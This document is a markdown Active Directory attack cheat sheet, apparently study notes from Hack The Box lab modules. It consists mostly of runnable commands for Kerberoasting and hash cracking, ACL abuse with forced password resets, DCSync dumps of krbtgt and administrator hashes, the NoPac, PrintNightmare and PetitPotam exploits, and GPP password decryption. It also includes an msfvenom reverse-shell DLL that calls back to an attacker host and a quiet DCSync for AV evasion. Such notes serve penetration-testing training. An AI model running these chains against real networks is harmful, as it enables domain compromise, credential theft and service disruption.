## Kerberoast
Kerberoasting is a lateral movement/privilege escalation, focusing accounts with [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names). It retrieves a Kerberos ticket (encrypted with the service account’s NTLM hash) for a service account with an SPN set. Look for kerberoast against forest ; sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has ``Domain/Enterprise Admin privileges`` in both domains.
### Kerberoasting from Linux
```bash
# List SPN Accounts 
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# Request all TGS Tickets
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request

# Request a single TGS Ticket
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

# Output the TGS Ticket
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

# Cracking the TGS Ticket
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```
### Kerberoasting from Windows Semi Manual
```bash
# Enumerating SPNs
C:\htb> setspn.exe -Q */*

# Targeting a single user. Ticket will be loaded in memory
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Retrieving all Tickets. Tickets will be loaded in memory
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# Using mimikatz.exe to extract Tickets from memory to a .kirbi file
mimikatz > kerberos::list /export

# Use kirbi2john.py on Exegol to retrieve Ticket. This will create a crack_file 
python2.7 kirbi2john.py sqldev.kirbi

# Preparing crack_file for hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# Crack the hash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 



# If we cannot move files easily, we could use the mimikatz's base64 Ticket output
mimikatz > base64 /out:true
mimikatz > kerberos::list /export

# Prepare the generated base64 output for cracking, and save the new output to a encoded_file
echo "<mimikatz's base64 output>" |  tr -d \\n

# Convert encoded_file as .kirbi, and repeat step w/ kirbi2john.py
cat encoded_file | base64 -d > sqldev.kirbi
```
### Kerberoasting from Windows w/ PowerView.ps1
```bash
PS C:\htb> Import-Module .\PowerView.ps1
# Enumerate SPN accounts
PS C:\htb> Get-DomainUser * -spn | select samaccountname

# Target a specific user
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Export all Tickets to a .csv file
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

# The .csv will contain the Ticket's hash
PS C:\htb> cat .\ilfreight_tgs.csv
<SNIP>
"$krb5tgs$23$*adfs$INLANEFREIGHT.LOCAL$adfsconnect/azure01.inlanefreight.local*$59C086008BBE7EAE4E483506632F6EF8$622D9E1DBCB1FF2183482478B5559905E0CCBDEA2B52A5D9F510048481F2A3A4D2CC47345283A9E71D65E1573DCF6F2380A6FFF470722B5DEE704C51FF3A3C2CDB2945CA56F7763E117F04F26CA71EEACED25730FDCB06297ED4076C9CE1A1DBFE961DCE13C2D6455339D0D90983895D882CFA21656E41C3DDDC4951D1031EC8173BEEF9532337135A4CF70AE08F0FB34B6C1E3104F35D9B84E7DF7AC72F514BE2B346954C7F8C0748E46A28CCE765AF31628D3522A1E90FA187A124CA9D5F911318752082FF525B0BE1401FBA745E1
```
### Kerberoasting from Windows w/ Rubeus
```bash
# Gather stats, including SPN accounts
PS C:\htb> .\Rubeus.exe kerberoast /stats

# Request Ticket for accounts with the "admincount" attribute set to 1. The /nowrap flag will facilitate the hash output
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

**Note :** Kerberoasting tools typically request `RC4 encryption` when performing the attack and initiating TGS-REQ requests because RC4 is [weaker](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) and easier to crack offline than other encryption algorithms such as AES-128 and AES-256. More in the [HTB_AD_Kerberoast](https://academy.hackthebox.com/module/143/section/1423) module.



# Access Control List (ACL)
Used to define which users or processes can access an object and what actions they can perform. ACL are made of `Access Control Entries` (`ACEs`). 2 types of ACLs : 
1. `System Access Control Lists` (`SACL`) - allow administrators to log access attempts made to secured objects.
2. `Discretionary Access Control List` (`DACL`) - defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access.
More info on the [HTB_ACL](https://academy.hackthebox.com/module/143/section/1456) module.
## AbuseACL
[AbuseACLs](https://github.com/AetherBlack/abuseACL) for enumerating ACEs / ACLs.
Then we can use the documentation of [DACL](https://www.thehacker.recipes/a-d/movement/dacl) to find out how to exploit the rights and use [dacledit](https://github.com/ThePorgs/impacket/blob/master/examples/dacledit.py) to exploit the ACEs.
```bash
# Look at the options because they've been updated and not the readme !!!! 
abuseACL -h

# List vulnerable ACEs/ACLs for the current user
abuseACL -recurse $DOMAIN/$USER:"$PASSWORD"@$TARGET

# List vulnerable ACEs/ACLs for another user/computer/group
abuseACL -principal Aether $DOMAIN/$USER:"$PASSWORD"@$TARGET

# List vulnerable ACEs/ACLs for a list of users/computers/groups
abuseACL -principalsfile accounts.txt $DOMAIN/$USER:"$PASSWORD"@$TARGET

# List vulnerable ACEs/ACLs on Schema or on adminSDHolder
abuseACL -extends $DOMAIN/$USER:"$PASSWORD"@$TARGET
```
## ACL Enumeration w/ PowerView.ps1
```bash
PS C:\htb> Import-Module .\PowerView.ps1

# Find interesting ACL, but massive info returned
PS C:\htb> Find-InterestingDomainAcl

# Perform targeted ACL enumeration of the wley user. We then need to Google for the GUID values returned
PS C:\htb> $sid = Convert-NameToSid wley
PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Instead of Googling GUID values, we could perform a reverse search & map values
PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

# Or directly use the "-ResolveGUIDs" option of PowerView.ps1, if not blocked ;)
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} -Verbose
```
## ACL Enumeration w/ PowerShell
```bash
# Create a list of domain users
PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

# Retrieve ACL info for each domain user. We could perform the same GUID reverse search as above (or Google values)
PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```
## ACL Enumeration w/ BloodHound
```bash
# Start neo4j database
neo4j start

# Bloodhound-python = SharpHound
bloodhound-python -u 'svc-alfresco' -p 's3rvice' -ns 10.10.10.161 -d htb.local -c all

# The zip files can the gathered into a zip folder
zip -r domain.zip ./*.json

# Import the zip archive into BloodHound GUI
bloodhound

# Set controlled user as starting node, select "Node Info" and go under "Outbound Control Rights". "First Object Control" will show the first set of rights, and "Transitive Object Control" all our user's ACL attack paths.

# Right click on the line between 2 objects + "Help" will presented valuable info about the ACLs.
```
## ACL Abuse Tactics
Attack chain performed here :
1. Use the `wley` user to change the password for the `damundsen` user.
2. Authenticate as the `damundsen` user & leverage `GenericWrite` rights to add a user that we control to the `Help Desk Level 1` group.
3. Take advantage of nested group membership in the `Information Technology` group and leverage `GenericAll` rights to take control of the `adunn` user. We'll abuse the `GenericAll` rights by performing a targeted Kerberoasting attack by creating a fake SPN that we can then Kerberoast to obtain the TGS ticket.
```bash
# 1. Changing user's password : as wley, create a PSCredential Object
PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# Create a SecureString Object, representing the new password set for damundsen
PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

# Change the user's password, here using PowerView.ps1's "Set-DomainUserPassword" function
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose



# 2. Add damundsen user to the "Help Desk Level 1" group, by creating again a PSCredential Object
PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

# Use PowerView.ps1's "Add-DomainGroupMember" function
PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

# Verify the user has been added to the group
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName



# 3. Use GenericWrite to perform a targeted Kerberoast attack. We'll first create a fake SPN
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# Kerberoast using any methods. Here we'll use Rubeus (fastest)
PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap

# The tool https://github.com/ShutdownRepo/targetedKerberoast could perform the same attack from a Linux host, creating a temporary SPN, retrieving the hash and deleting the temporary SPN, all in one command.
```
## Clean Up Changes
```bash
# Removing fake created SPN for adunn
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

# Remove damundsen user from "Help Desk Level 1" group
PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

# Tell the client every other changes we couldn't clean in the report
```
## DCSync
```bash
# Get adunn's Group Membership & retrieve SID
PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl

# Check adunn's Replication Rights over the domain. Need "DS-Replication-Get-Changes" & "DS-Replication-Get-Changes-All"
PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

# Performing DCSync w/ secretsdump.py. Will write all hashes to a domain_hashes file. "-just-dc" extract NTLM hashes + Kerberos keys from NTDS.dit file
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5

# Performing attack using -just-dc-user to be quieter. Target krbtgt to perform Golden Tickets next
secretsdump.py -outputfile inlanefreight_hashes -just-dc-user krbtgt INLANEFREIGHT/adunn@172.16.5.5
```
### Accounts w/ Reversible Encryption set
[RC4 encryption](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) uses key to decrypt passwords, but the key used is stored in the registry (the [Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)) and can be extracted by a Domain Admin or equivalent. 
```bash
# List users w/ reversible encryption option set
PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

# List users w/ reversible encryption option set w/ PowerView.ps1 & decrypt the password
PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```
### DCSync w/out touching NTDS.DIT
Using [Aether](https://github.com/AetherBlack/DCSync/) tool. The aim is to perform ``quiet DCSync`` for AV evasion
```bash
# Performing DCSync on a single user
dcsync -just-user krbtgt -k $DOMAIN/$USER:"$PASSWORD"@$DC

# Performing DCSync on the whole domain w/ Administrator privileges
dcsync $DOMAIN/$USER:"$PASSWORD"@$DC

# Perform DCSync on the whole domain w/out Administrator privileges using LDAP method
dcsync -method ldap $DOMAIN/$USER:"$PASSWORD"@$DC
```
We could then perform [Golden Ticket](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden) attack after domain compromission.
# Lateral Movement
## Remote Desktop
```bash
# Enumerate Remote Desktop Users Group w/ PowerView.ps1
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

# We could also check this using BloodHound

# Bypass RDP Restricted Admin Mode (need admin privileges)
PS C:\htb> reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
## WinRM
```bash
# Enumerate Remote Management Users Group w/ PowerView.ps1
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

# Using Cypher Query in BloodHound (in "Raw Query")
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```
## SQL Server Admin
```bash
# Enumerate SQL Admin Rights w/ Cypher Query in BloodHound
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2

# Or using https://github.com/SnaffCon/Snaffler

# Hunt for MSSQL Instances w/ PowerUpSQL.ps1
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain
```



# Bleeding Edge Vulnerabilities
Be sure to trully understand what every attack does in real-word, some (PrintNightmare, [Zerologon](https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/) or [DCShadow](https://stealthbits.com/blog/what-is-a-dcshadow-attack-and-how-to-defend-against-it/)…) could cause service disruption.
## NoPac (SamAccountName Spoofing)
The [Sam_The_Admin vulnerability](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699), also called `noPac` or referred to as `SamAccountName Spoofing`, encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287). The [exploit](https://academy.hackthebox.com/module/143/section/1484) takes advantage of being able to change the `SamAccountName` of a computer account to that of a Domain Controller, allowing intra-domain privilege escalation.
```bash
cd /opt/tools/nopac

# Scanning for NoPac
python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

# Run NoPac & Get a shell
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

# NoPac save the TGT in a .ccache file where exploit was run. We could use this ccache file to PassTheTicket and DCSync 
# NoPac to DCSync the Built-in Administrator Account
python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```
## PrintNightmare
[PrintNightmare](https://academy.hackthebox.com/module/143/section/1484) exploit two vulnerabilities ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) found in the [Print Spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) that runs on all Windows operating systems, for local privilege escalation.
```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git

# See if "Print System Asynchronous Protocol" and "Print System Remote Protocol" are exposed on target
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

# If exposed, we could craft a DDL payload w/ Msfvenom & configure MSF exploit/multi/handler
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

# Host DLL payload in SMB share
smbserver.py -smb2support CompData /path/to/backupscript.dll

# Run the exploit
python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```
## PetitPotam (MS-EFSRPC)
[PetitPotam](https://academy.hackthebox.com/module/143/section/1484) ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an LSA spoofing vulnerability allowing unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM. This technique allows an unauthenticated attacker to take over a Windows domain where [ADCS](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use.
```bash
# Start ntlmrelayx.py w/ the Web Enrollment URL for the CA host. Cf https://github.com/zer1t0/certi to find URL
ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

# In another shell, run exploit to coerce DC to authenticate to NTLM relay. If successfull, we'll get the base64 encoded certificate for the DC 
python3 PetitPotam.py 172.16.5.225 172.16.5.5

# Method 1 : Use base64 certificate w/ Rubeus on a Windows host to request a TGT and perform PassTheTicket
PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt

# Or use PassTheTicket to perform DCSync w/ mimikatz from Windows host
mimikatz > lsadump::dcsync /user:inlanefreight\krbtgt



# Method 2 : Request TGT for DC w/ base64 encoded string. The TGT will be saved to dc01.ccache file
gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache

# Set KRB5CCNAME Env Variable so that Exegol uses it for Kerberos Auth
export KRB5CCNAME=dc01.ccache

# Use TGT to DCSync and retrieve hashes
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
# Or (don't need to put username because it will be saved in ccache file. Use "klist" command to verify)
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL



# Method 2.1 : Use TGT to request NT hash for host/user w/ AS-REP encryption key obtained earlier when requesting TGT
getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
# We can use this NT hash to DCSYnc
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```



# Miscellaneous Misconfigurations
## Exchange Related Group Membership
Installation of [Microsoft Exchange](https://academy.hackthebox.com/module/143/section/1276) within an AD environment opens up many [attack vectors](https://github.com/gdedrouas/Exchange-AD-Privesc), as Exchange is often granted considerable privileges within the domain (via users, groups, and ACLs). The group `Exchange Windows Permissions` is not listed as a protected group, but members are granted the ability to write a DACL to the domain object.
## PrivExchange
The `PrivExchange` attack results from a flaw in the Exchange Server `PushSubscription` feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.
The exchange service runs as ``SYSTEM`` and is [over-privileged](https://academy.hackthebox.com/module/143/section/1276) by default. This flaw can be leveraged to relay to LDAP and dump the domain NTDS database. If we cannot relay to LDAP, this can be leveraged to relay and authenticate to other hosts within the domain. This attack will take you directly to Domain Admin with any authenticated domain user account.
## Printer Bug
The [Printer Bug](https://academy.hackthebox.com/module/143/section/1276) is a flaw in the MS-RPRN protocol (Print System Remote Protocol). We could use [this](http://web.archive.org/web/20200919080216/https://github.com/cube0x0/Security-Assessment) tool or [this](https://github.com/NotMedic/NetNTLMtoSilverTicket) one. (Exegol don't have)
```bash
# Enumerate MS-PRN Printer Bug
PS C:\htb> Import-Module .\SecurityAssessment.ps1
PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
## MS14-068
This was a [flaw](https://academy.hackthebox.com/module/143/section/1276) in the Kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to Domain Admin. A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation.

The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. This can be leveraged to create a fake PAC, presenting a user as a member of the Domain Administrators or other privileged group. It can be exploited with tools such as the [Python Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) or the Impacket toolkit. The only defense against this attack is patching. [Mantis](https://app.hackthebox.com/machines/98) box showcases this vulnerability.
## Sniff LDAP Credentials
Many applications and printers store ``LDAP credentials`` in their web admin console to connect to the domain. These consoles are often left with weak or default passwords. Sometimes, these credentials can be viewed in cleartext. Other times, the application has a `test connection` function that we can use to gather credentials by changing the ``LDAP IP address`` to that of our attack host and setting up a `netcat` listener on LDAP port 389. When the device attempts to test the LDAP connection, it will send the credentials to our machine, often in cleartext. Accounts used for LDAP connections are often privileged, but if not, this could serve as an initial foothold in the domain. Other times, a full LDAP server is required to pull off this attack, as detailed in this [post](https://grimhacker.com/2018/03/09/just-a-printer/).
## Enumerating DNS Records
Enumerating all DNS records in a domain could be especially helpful if the naming convention for hosts returned to us in our enumeration using tools such as `BloodHound` is similar to `SRV01934.INLANEFREIGHT.LOCAL`. If all servers and workstations have a non-descriptive name, it makes it difficult for us to know what exactly to attack.
By default, all users can list the child objects of a DNS zone in an AD environment, and querying DNS records using LDAP does not return all results. So by using the `adidnsdump` tool, we can resolve all records in the zone and potentially find something useful for our engagement. The background and more in-depth explanation of this tool and technique can be found in this [post](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/).
```bash
# Enumerate all DNS records and save result in a records.csv file
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 

# The -r will attempt to resolve unknown records w/ A query
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```
## Password in Description Field
```bash
# In large domain, export data to a csv file
PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```
## PASSWD_NOTREQD Field
With the [passwd_notreqd](https://ldapwiki.com/wiki/Wiki.jsp?page=PASSWD_NOTREQD) field set, users are not subject to the current password policy length (could have shorter pass or no pass at all). 
```bash
PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```
## Credentials in SMB Shares & SYSVOL Scripts
SYSVOL shares can be a treasure trove of data, especially in large organizations. We may find batch, VBScript, or PowerShell scripts readable by all authenticated users in the domain.
```bash
PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```
## Group Policy Preferences (GPP) Passwords
When a new [GPP](https://academy.hackthebox.com/module/143/section/1276) is created, an .xml file is created in the SYSVOL share. These files can contain an array of configuration data and defined passwords. The `cpassword` attribute value is AES-256 bit encrypted, but Microsoft [published the AES private key on MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), which can be used to decrypt the password.
``GPP passwords`` can be found using [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1), the GPP Metasploit Post Module, NetExec…
The `gpp-decrypt` utility can be used to decrypt the ``cpassword`` value :
```bash
# Use NetExec to retrieve GPP Passwords
netexec smb -L | grep gpp

# Decrypt GPP Passwords
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

# Hunt for Registry.xml when autologon is configured via Group Policy
netexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
# Or using PowerSploit's Get-GPPAutologon.ps1 script
```
## ASREPRoasting
We can obtain a TGT for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled. [ASREPRoasting](https://academy.hackthebox.com/module/143/section/1276) is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required.
Enumerating users w/ ``Kerbrute`` will automatically retrieve the AS-REP for any users that ``do not require Kerberos pre-authentication``.
```bash
# Enumerate for "DONT_REQ_PREAUTH" Value
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Retrieving AS-REP w/ Rubeus
PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

# Crack the hash
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 

# Hunt users w/ Kerberoast Pre-auth Not Required with a list of valid users / jsmith.txt
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
```
## Group Policy Object (GPO) Abuse
[Group Policy](https://academy.hackthebox.com/module/143/section/1276) provides administrators with advanced settings that can be applied to user and computer objects in an AD environement (denying cmd.exe access, for example).
If we can gain rights over a Group Policy Object via an ACL misconfiguration, we could leverage this to achieve privilege escalation. 
```bash
# Enumerate GPO Names w/ PowerView.ps1
PS C:\htb> Get-DomainGPO |select displayname

# Enumerate GPO Names w/ Built-in cmdlet
PS C:\htb> Get-GPO -All | Select DisplayName

# Check if a user has right over GPO
PS C:\htb> $sid=Convert-NameToSid "Domain Users"
PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# Retrieve the name of the GPO
PS C:\htb> Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532

# We can also check that w/ BloodHound
```
